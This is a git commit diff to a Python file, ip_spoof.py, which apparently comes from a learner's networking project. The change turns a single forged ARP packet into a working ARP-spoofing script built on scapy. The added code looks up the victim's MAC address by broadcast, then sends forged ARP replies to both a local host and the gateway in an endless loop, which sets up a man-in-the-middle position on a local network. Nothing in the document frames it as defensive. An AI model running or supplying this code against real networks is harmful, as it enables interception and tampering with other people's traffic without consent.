dcade43066fdfd04f852ad6341a767094e997da5
dashzou <fxfddfno@gmail.com>
2020-07-01 06:50:33 -0400

    send packet and get mac address to target

--- ip_spoof.py
+++ ip_spoof.py
@@ -1,9 +1,31 @@
 
 import scapy.all as scapy
+import time
+
+
+def get_mac(ip):
+    # send packet
+    arp_request = scapy.ARP(pdst=ip)
+    # create broadcast
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_boradcast = broadcast/arp_request
+
+    # srp send and get response to get mac_target
+    answared = scapy.srp(arp_request_boradcast, timeout=10, verbose=False)[0]
+    print(answared)
+    #print(answared[0][1].hwsrc)
+    return answared[0][1].hwsrc
 
 # packet ready to send it.
-packet = scapy.ARP(op=2, pdst="192.168.1.115", hwdst="00:0c:29:48:51:8c", psrc="192.168.1.1")
-print(packet.summary())
-print(packet.show())
+def spoof(target_ip, spoof_ip):
+	target_mac = get_mac(target_ip)
+	#print(target_mac)
+	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+	#print(packet.summary())
+	#print(packet.show())
+	scapy.send(packet)
 
-scapy.send(packet)
+while True:
+	spoof("192.168.1.115", "192.168.1.1")
+	spoof("192.168.1.1", "192.168.1.115")
+	time.sleep(2)
